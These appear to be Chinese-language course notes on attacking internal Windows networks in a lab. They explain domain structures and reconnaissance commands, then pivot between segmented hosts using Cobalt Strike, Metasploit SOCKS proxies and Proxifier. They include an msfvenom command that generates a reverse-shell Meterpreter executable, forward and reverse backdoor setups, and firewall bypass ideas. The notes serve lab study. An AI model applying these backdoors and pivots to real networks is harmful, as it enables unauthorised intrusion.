#   内网基础

# 域

分类：单域、子域、父域、域树、域森林、DNS域名服务器

单域环境

![1732196598012](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942982.png)

父子域：![1732196518518](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942983.png)

域树 ：

![1732196624195](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942984.png)

 域森林  test和abc 直接取得了信任关系      在他们下面就是域森林

![1732196642767](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942985.png)



虚拟机分类：

windows    2016  DC  域控

windows    2008   WEB  网站服务器

Windows 10&7    PC  普通办公电脑

  配置环境 

dns 和ip  配置：

 为了域控能够控制网内每一个主机的流量（网站解析流量），这里就让内网每一个主机用同一个dns解析

对ip 进行静态设置

## 单域

后面的dns服务器都指向DC（  dns服务器） 的ip192.168.22.11

![1732202058737](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942986.png)



![1732202614066](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942987.png)

https://mp.weixin.qq.com/s/128Ap8ohEBDweg0jNM-T5g 常见命令

   工具插件

win7激活

域内：域内用户

域外：1、需要取得这个主机的系统权限或者这个主机的域内权限（换成域内用户）

判断是否为域内用户：（这里权限就是普通用户xd）

![1732244300080](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942988.png)



高权限也可以执行net user /domain        (administrator/system)

![1732244399149](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942989.png)



net time /domain  定位域控 （一般域内主机都以域控主机的时间为主）

知道域控的域名后直接ping 得到ip

  提权win10

# 父子域（多域）

搭建父子域环境（本机内存配置不支持，没有搭建成功）

net user /domain 只能看到自己这一级的上一级域控，上上级和旁级都看不到。

![1732256467561](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942991.png)

net view /domain   查看当前所有域的上级关系。需要开一个配置![1732258184854](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942992.png)

单域：

![1732256749563](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942993.png)



多个父子域：

![1732256755131](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942994.png)

子域下面的DC互相通讯不了，操作更改也是，父域可以改子域，但是不能改同一级的父域。

主要大多数还是配置环境（域环境）

# 域森林，域树林

域树林：最上面是一个父域

域森林：最上面有多个父域

##### 信任

森林的话---树之间需要配置信任关系（能通讯）这里就是xiaodi8.org个xiaodi.org信任关系建立

![1732268093923](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942995.png)

![1734016003951](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942996.png)

配置dns也是一级一级的向上匹配。

树林和森林之前的区别就是最上面是一个父域还是多个父域

xiaodi.org和xaiodi.org

1h20,      有时候A父域跟其他B父域相互信任，但是A子域不一定和B子域相互信任，主要看配置。

这节课主要还配置

#### 配置环境：

补充一下、怎么加域，这里是老版本的，win10以上差不多：

![image-20241223174332058](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942997.png)

![image-20241223174435398](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942998.png)

这里注意：加域就隶属于域，写好域名，输入DC账户密码就行，如果是重新进域，就得先加入工作组，随便进一个，重启后在重新进域就可以了。

![image-20241223174508491](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942999.png)



win10：

![image-20241223174854971](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942000.png)

哦对，再补充一下，在保证你的网段和DC在同一个网段下时候，加域报错什么找不到域啊啥的，就重新设置一下ip的分布，在加：

![image-20241223175510433](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942001.png)



# 内网信息

不出网：没网络（上不了网）     /      限制你上网，限制了流量

网络不可达：指的是内网---没网自己的主机也可以和虚拟机互通

环境配置：环境帐号密码：administrator/xiaodi 	这里没有搭建windows2016 DC机		

这里配置就是让本机访问不到2 、3 、4三个网段，模拟内网环境，真实

![1732341321876](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942002.png)

![1732342725259](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942003.png)

下图中因为都在一个网段（192.168.139.  * -----192.168.139. *   ）互相联系，所有最后都可以通信

### 总况

![1732271126086](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942004.png)

### Windows

ipconfig /all 	 ；一个主机上有2个网段



![1732341893489](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942005.png)

在sql主机上搭建一个网站：

![1732342405010](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942006.png)

web和sql直接是2网段通信：

![1732342569419](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942007.png)

![1732342591772](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942008.png)

信息收集：使用代理就不用将自己的工具上传到目标主机上进行渗透，只需要放自己主机上进行操作。代理就是添加一个节点（sockS）

 上线操作设置代理          回头时将Proxifier配置，主要是原理，重新理解一下

socks代理，就是理解为在自己的攻击机上(这里的攻击机为cs服务器，也就是kali)打开一个16150的端口，用这个端口节点和目标web机建立通信

![1732343327086](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942009.png)

所有这里代理配置时候也是连接的kali（攻击机）的ip (要用kali的这个接口016150与目标建立通讯)

![1732343472979](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942010.png)

配置好代理，就是通过cs服务器（kali ）建立了一个节点16150，来连接了目标web主机，然后通过代理这个节点就可以与目标主机web进行通讯，

![1732345799165](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942011.png)

因为目标主机web能与sql主机进行通讯，所有通过代理节点，本机也可以与sql主机通讯

![1732345781534](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942012.png)

能在内网主机访问，外网主机想访问22 时需要用proxifier走个代理进行通讯，或者用fscan 扫描信息。但是proxifier一关就不能通讯，fscan也扫不到信息

![1732346749235](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942013.png)

​    reverse 反向

​				bind       正向 		 不需要配置ip	4.exe

反向就是：以攻击机为第一人称，让目标机器主动连接攻击机。一般用reverse 反向 ，因为防火墙一般对外部到内部过滤严格，内部出去到外部过滤很少。

正向：还是以攻击机为第一视角，让目标主机开一个口子，然后等着攻击机连接自己。

这里就是sql主机正常反向连接是找不到c2服务端(kali)，因为没在一个网段 。所以就做一个正向后门，让sql主机正向连接，反向是有目标，正向是不知道目标。

下面演示的是正向：

这里正向监听器就没有配置ip ,也就是说，用这种监听器生成后门，默认就是绑定自己（cs）的4444端口

![1732347332244](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942014.png)

生成正向后门：

![1732347681381](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942015.png)

![1732347798808](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942016.png)

运行4444.exe后，发现sql机主动开了一个4444端口（等待别人来连接）：

![1732347820581](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942017.png)

然后用 cs控制Web主机连接sql机：

![1732347931397](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942018.png)

sql主动找的web，间接找的kali    ------------ 这就是正向

![1732347999544](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942019.png)



### 演示：

kali （攻击机）刚开始只能与web主机进行通信，然后上传后门到web主机上线操作，控制得到权限后，因为kali 不能与sql主机进行通信，但是web主机可以与sql进行通信（上图），所有可以kali通过控制web主机（connect 192.168.2.22 4444）连接sql主机。

![1732287156916](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942020.png)

在sql主机上也有一个后门点击会打开自己的4444端口等待连接

  file主机开了一个ftp服务，还是改proxifier，通过ftp拿到file主机权限（这里过程粗略跳过），

连接file主机一样过程：socks代理----proxifier代理（这里注意：配置的服务器还是c2（kali）,更改的是端口和代理规则的目标主机ip--192.168.3.*-----fscan扫-------上正向后门）后面一样

连接DC：

还是先建立socks代理（开一个节点）                                      这里遮住的是192.168.3.22（file主机）

![1732287986076](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942021.png)

接下来配置proxifier

1:	

![1732288157910](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942022.png)

2:

![1732288132353](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942023.png)



下来还是用fscan进行扫描。后面一样。

 

### msf：

linux中的Proxifie是Prixychains。

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.139.128 LPORT=3333 -f exe -o msf.exe  生成一个反向连接后门

![1732348972625](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942024.png)

这里shell后查看路由：（看web目标机上的路由--发现有139和2网段两个）：

![1732349158160](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942025.png)



下来和刚才一样，用的是 auxiliary/server/socks_proxy    模板来 创建socks节点：版本用5 端口set 为8989

![1732349444274](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942026.png)

用windows的代理配置：

![1732349539438](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942027.png)



用linux的代理访问： Proxychains   （模板）  （linux）

![1732350057902](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942028.png)

这里和刚才cs一样：就是用msf生成一个正向exe：

![1732350602586](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942029.png)

下来连接sql机时web机的session不能掉线：是通过Web来通讯sql的

![1732350933447](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942030.png)

sql机上线  正向exe：

![1732352609023](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942031.png)

还是创建socks 。：

![1732352648446](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942032.png)

与file机建立通讯：

![1732352681445](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942033.png)



sessions：

一台控制一台

![1732352885051](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942034.png)

有时候socks代理好了但是ping 不通，这是因为ping走的是icmp协议，但是socks走的协议没有ping 的级别高

 演示后续

最开始是：  ----- 基础网络知识        这里kali只要和内网一台主机通讯就行（公网 / 有节点）

先上线后创建socks节点----------挂上Proxy代理----------生成正向exe---------等待上线



# 防火墙

 ：配置

隧道技术：

icmp    dns:解析网站域名IP 协议 				 ssh : 连接linux主机的通信协议

也能看见，出站默认是允许的

![1732443049734](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942035.png)

  连接内网sql   ,

web有防火墙sql没有         

  web没有sql有防火墙 	所以正向后门连接不上

  防火墙入站出战配置

web到sql 之间有防火墙、这里是在web上建立一个反向监听器，让sql主机主动找web

![1732437963303](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942036.png)

演示：

web 机的ip：

![1732445259720](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942037.png)

这里就是让web机设立一个监听器，让sql机来连接web（出站）：

![1732445446401](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942038.png)

生成反向后门: 

![1732445495430](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942039.png)

这里对比，在将刚才的后门123.exe，和4444的正向后门上传上去：

sql主机主动连接web机：



![1732445944278](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942040.png)

执行3个exe后，connect 192.168.2.22 4444 不行说明防火墙阻拦了入站，123.exe不行说明sql和kali（c2服务器不通讯）1234.exe成功上线说明sql(22)成功出站连接到222（web机）

![1732446104395](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942041.png)







下面这种情况是正反都不行---都不能上线：

kali---->web 用反向连接成功上线，但是web 到sql :正向(web--->sql)有sql的入站防火墙，反向连接（sql--->web）对于web来说就是入站，也有入站防火墙

![1732438005147](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942042.png)



3种方法解决：

1、用命令关闭防火墙。

2、SMB协议通讯上线（默认放行）

3、利用隧道技术上线（规则决定）

 关闭sql防火墙进行正向连接

  内网域中：看怎么关闭防火墙。

   关闭防火墙失败，拿到system* 权限也没有关----在域环境中

1h14 smb（文件打印和共享）协议通讯、钻空子

隧道技术： 就是改协议，将一个被防火墙禁止的协议改成一个可以允许通过的协议。将正向后门走icmp协议

第三种：主要还是看防火墙的策略配置。


# 域森林

不用复现。需要内存和运行不起来。

主要是与前面课程的单域环境之间看有什么差异。


![1734011322125](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942328.png) 

这里可以看见前面有很多的....                 h.hr.xiaodi.org

![1734011644197](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942329.png)

这里也可以Ping hhrdc来定位ip

当前处于           hr.xiaodi.org           上一级就是xiaodi.org          下一级是  xx.hr.xiaodi.org

看有没有上一级或者下一级还可以看计算机名字

XDORG（xiaodi.org）					XDORG/webadmin     xiaodi.org的域用户

​	HRXRORG(hr.xiaodi.org)				   hr.xiaodi.org的域为：HRXRORG

​		HHRORG(h.hr.xiaodi.org)               h.hr.xiaodi.org的域为：HHRORG

​	GAXDORG(ga.xiaodi.org)						GAXDORG/administrator      ga.xiaodi.org的DC

​		GGAORG(h.ga.xiaodi.org)

XIAODI8（xiaodi8.org）

横向移动时候，其实主要还是看域用户对应正确，然后口令密码正常。限制：网络不通讯，就打一个能与自己通讯然后一层一层绕到能和目标通讯的机子

域名     ----- 域内用户    ---------- 用户密码 -------------  通讯---- DC的ip        这几个都要一一对应

这节就不复现了，因为主要为理解，没有太多知识








